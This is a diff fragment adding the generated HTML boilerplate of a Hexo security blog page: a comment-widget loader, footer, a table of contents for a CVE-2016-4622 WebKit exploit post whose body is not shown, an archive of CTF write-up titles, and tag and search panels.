+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:qimaidoukanluori@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/qimaidoukanluori" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">到访的小伙伴: <span id="busuanzi_value_site_pv"></span>只 </span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:30vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2016-4622"><span class="toc-number">1.</span> <span class="toc-text">CVE-2016-4622</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">1.2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#调试环境"><span class="toc-number">1.3.1.</span> <span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞点"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Javascript类型转换"><span class="toc-number">1.3.3.</span> <span class="toc-text">Javascript类型转换</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">1.4.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addrof"><span class="toc-number">1.4.1.</span> <span class="toc-text">addrof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeobj"><span class="toc-number">1.4.2.</span> <span class="toc-text">fakeobj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StructureID"><span class="toc-number">1.4.3.</span> <span class="toc-text">StructureID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造对象"><span class="toc-number">1.4.4.</span> <span class="toc-text">伪造对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlap-boxed与unboxed"><span class="toc-number">1.4.5.</span> <span class="toc-text">overlap boxed与unboxed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读写函数"><span class="toc-number">1.4.6.</span> <span class="toc-text">读写函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取RWX区域"><span class="toc-number">1.4.7.</span> <span class="toc-text">获取RWX区域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意写"><span class="toc-number">1.4.8.</span> <span class="toc-text">任意写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.6.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞修复"><span class="toc-number">1.7.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LINK"><span class="toc-number">1.8.</span> <span class="toc-text">LINK</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 53
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href= "/2020/04/25/Vuln_CVE_2019_8515_FTL_JIT_LICM_OOB_access/" >[Vuln]CVE-2019-8515 FTL JIT LICM OOB access</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2020/04/19/Vuln_BUG_191731_WebKit_RegExp_lastIndex_TypeConfusion/" >[Vuln]BUG-191731 WebKit RegExp lastIndex TypeConfusion</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2020/04/19/Vuln_CVE_2016_4622_WebKit_Array_slice_OOB_access/" >[Vuln]CVE-2016-4622 WebKit Array slice OOB access</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Binary_Iot设备如何拿到调试shell/" >[Binary]Iot设备如何拿到调试shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2019/10/30/Binary_Unicorn学习/" >[Binary]Unicorn学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2019/09/10/WP_2019ByteCTF/" >[WriteUp]2019ByteCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2019/08/26/WP_2019OGeek/" >[WriteUp]2019OGeek</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2019/07/31/WP_2019CISCN final/" >[WriteUp]2019CISCN final</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/07</span><a class="archive-post-title" href= "/2019/07/07/WP_2019WCTF/" >[WriteUp]2019WCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/Asm_WASM格式化字符串攻击尝试/" >[Asm]WASM格式化字符串攻击尝试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2019/01/22/Code_Python可变类型的一些问题/" >[Code]Python可变类型的一些问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2019/01/13/Asm_WASM初步/" >[Asm]WASM初步</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/20</span><a class="archive-post-title" href= "/2018/12/20/Binary_通过a的leak/" >[Binary]通过%a的leak</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/WP_hxpCTF/" >[WriteUp]hxpCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2018/11/27/WP_2018BCTF/" >[WriteUp]2018BCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/Binary_IO_FILE源码分析/" >[Binary]IO_FILE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2018/11/05/Binary_ArmPwn/" >[Asm]ARMPwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/WP_上海杯/" >[WriteUp]上海杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_HCTF/" >[WriteUp]HCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_SECCONCTF/" >[WriteUp]SECCONCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_湖湘杯/" >[WriteUp]湖湘杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2018/10/24/Binary_Tcache/" >[Binary]Tcache</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/Asm_RealmodeAsm/" >[Asm]RealmodeAsm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/WP_2018护网杯/" >[WriteUp]护网杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span><a class="archive-post-title" href= "/2018/10/06/Binary_IDADynamic/" >[Binary]IDADynamic</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/Linux_pwn环境搭建/" >[Linux]pwn环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/WP_DragonCTF/" >[WriteUp]DefCampCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/WP_InCTF/" >[WriteUp]InCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/28</span><a class="archive-post-title" href= "/2018/09/28/Binary_PDF/" >[Binary]PDF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2018/09/27/Linux_GDB/" >[Linux]GDB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2018/09/27/Linux_GDB的python调试/" >[Linux]GDB的Python调试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2018/09/25/WP_DefCampCTF/" >[WriteUp]DefCampCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/Android_JNI/" >[Android]JNI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/BInary_HeapExploit/" >[Binary]HeapExploit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2018/09/13/Binary_IO_FILE/" >[Binary]IO_FILE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/Linux_GDB的源码调试/" >[Linux]GDB源码调试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2018/09/01/Binary_ptmalloc源码分析/" >[Binary]ptmalloc源码分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/WP_pwnable.tw/" >[WriteUp]pwnable.tw</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2018/08/21/Code_Python学习手册_7/" >[Code]Python学习手册_第七部分_异常和工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2018/08/21/WP_网鼎杯/" >[WriteUp]网鼎杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2018/08/14/Code_Python学习手册_6/" >[Code]Python学习手册_第六部分_类和OOP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2018/08/13/WP_JarvisOJ/" >[WriteUp]JarvisOJ</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2018/08/10/Code_Python学习手册_5/" >[Code]Python学习手册_第五部分_模块</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2018/08/05/Code_Python学习手册_4/" >[Code]Python学习手册_第四部分_函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2018/08/05/Binary_Heap/" >[Binary]Heap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/Linux_INT80/" >[Linux]int 80</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/Code_Python学习手册_3/" >[Code]Python学习手册_第三部分_语句和语法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2018/07/25/Binary_Canary/" >[Binary]Canary</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2018/07/24/Code_Python学习手册_2/" >[Code]Python学习手册_第二部分_类型和运算</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2018/07/22/Binary_fmt/" >[Binary]FormatString</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2018/07/21/Code_Python学习手册_1/" >[Code]Python学习手册_第一部分_使用入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2018/07/21/WP_巅峰极客/" >[WriteUp]巅峰极客</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/Code_Python的C拓展/" >[Code]Python的C拓展</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Note"><span class="iconfont-archer">&#xe606;</span>Note</span>
+    
+        <span class="sidebar-tag-name" data-tags="Assembly"><span class="iconfont-archer">&#xe606;</span>Assembly</span>
+    
+        <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="JNI"><span class="iconfont-archer">&#xe606;</span>JNI</span>
+    
+        <span class="sidebar-tag-name" data-tags="WASM"><span class="iconfont-archer">&#xe606;</span>WASM</span>
+    
+        <span class="sidebar-tag-name" data-tags="Asm"><span class="iconfont-archer">&#xe606;</span>Asm</span>
+    
+        <span class="sidebar-tag-name" data-tags="Binary"><span class="iconfont-archer">&#xe606;</span>Binary</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Canary"><span class="iconfont-archer">&#xe606;</span>Canary</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap"><span class="iconfont-archer">&#xe606;</span>Heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="IDA"><span class="iconfont-archer">&#xe606;</span>IDA</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="IO_FILE"><span class="iconfont-archer">&#xe606;</span>IO_FILE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Iot"><span class="iconfont-archer">&#xe606;</span>Iot</span>
+    
+        <span class="sidebar-tag-name" data-tags="PDF"><span class="iconfont-archer">&#xe606;</span>PDF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tcache"><span class="iconfont-archer">&#xe606;</span>Tcache</span>
+    
+        <span class="sidebar-tag-name" data-tags="Unicorn"><span class="iconfont-archer">&#xe606;</span>Unicorn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Fmt"><span class="iconfont-archer">&#xe606;</span>Fmt</span>
+    
+        <span class="sidebar-tag-name" data-tags="Code"><span class="iconfont-archer">&#xe606;</span>Code</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="GDB"><span class="iconfont-archer">&#xe606;</span>GDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwntools"><span class="iconfont-archer">&#xe606;</span>Pwntools</span>
+    
+        <span class="sidebar-tag-name" data-tags="Qemu"><span class="iconfont-archer">&#xe606;</span>Qemu</span>
+    
+        <span class="sidebar-tag-name" data-tags="Gdb"><span class="iconfont-archer">&#xe606;</span>Gdb</span>
+    
+        <span class="sidebar-tag-name" data-tags="Browser"><span class="iconfont-archer">&#xe606;</span>Browser</span>
+    
+        <span class="sidebar-tag-name" data-tags="WebKit"><span class="iconfont-archer">&#xe606;</span>WebKit</span>
+    
+        <span class="sidebar-tag-name" data-tags="TypeConfusion"><span class="iconfont-archer">&#xe606;</span>TypeConfusion</span>
+    
+        <span class="sidebar-tag-name" data-tags="OOB"><span class="iconfont-archer">&#xe606;</span>OOB</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="WriteUp"><span class="iconfont-archer">&#xe606;</span>WriteUp</span>
+    
+        <span class="sidebar-tag-name" data-tags="IntegerOverflow"><span class="iconfont-archer">&#xe606;</span>IntegerOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cfunc"><span class="iconfont-archer">&#xe606;</span>Cfunc</span>
+    
+        <span class="sidebar-tag-name" data-tags="HouseOfRoman"><span class="iconfont-archer">&#xe606;</span>HouseOfRoman</span>
+    
+        <span class="sidebar-tag-name" data-tags="ShellCode"><span class="iconfont-archer">&#xe606;</span>ShellCode</span>
+    
+        <span class="sidebar-tag-name" data-tags="prctl"><span class="iconfont-archer">&#xe606;</span>prctl</span>
+    
+        <span class="sidebar-tag-name" data-tags="global_max_fast"><span class="iconfont-archer">&#xe606;</span>global_max_fast</span>
+    
+        <span class="sidebar-tag-name" data-tags="read"><span class="iconfont-archer">&#xe606;</span>read</span>
+    
+        <span class="sidebar-tag-name" data-tags="UAF"><span class="iconfont-archer">&#xe606;</span>UAF</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTFtime"><span class="iconfont-archer">&#xe606;</span>CTFtime</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Fastbin"><span class="iconfont-archer">&#xe606;</span>Fastbin</span>
+    
+        <span class="sidebar-tag-name" data-tags="FormatString"><span class="iconfont-archer">&#xe606;</span>FormatString</span>
+    
+        <span class="sidebar-tag-name" data-tags="StackOvrtflow"><span class="iconfont-archer">&#xe606;</span>StackOvrtflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="Re"><span class="iconfont-archer">&#xe606;</span>Re</span>
+    
+        <span class="sidebar-tag-name" data-tags="wargame"><span class="iconfont-archer">&#xe606;</span>wargame</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cpp"><span class="iconfont-archer">&#xe606;</span>Cpp</span>
+    
+        <span class="sidebar-tag-name" data-tags="FastbinAttack"><span class="iconfont-archer">&#xe606;</span>FastbinAttack</span>
+    
+        <span class="sidebar-tag-name" data-tags="HeapOverflow"><span class="iconfont-archer">&#xe606;</span>HeapOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="Arm"><span class="iconfont-archer">&#xe606;</span>Arm</span>
+    
+        <span class="sidebar-tag-name" data-tags="SystemCall"><span class="iconfont-archer">&#xe606;</span>SystemCall</span>
+    
+        <span class="sidebar-tag-name" data-tags="StackOverflow"><span class="iconfont-archer">&#xe606;</span>StackOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="OJ"><span class="iconfont-archer">&#xe606;</span>OJ</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Assembly"><span class="iconfont-archer">&#xe60a;</span>Assembly</span>
+    
+        <span class="sidebar-category-name" data-categories="Code"><span class="iconfont-archer">&#xe60a;</span>Code</span>
+    
+        <span class="sidebar-category-name" data-categories="Binary"><span class="iconfont-archer">&#xe60a;</span>Binary</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="Vuln"><span class="iconfont-archer">&#xe60a;</span>Vuln</span>
+    
+        <span class="sidebar-category-name" data-categories="WriteUp"><span class="iconfont-archer">&#xe60a;</span>WriteUp</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "骑麦兜看落日"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
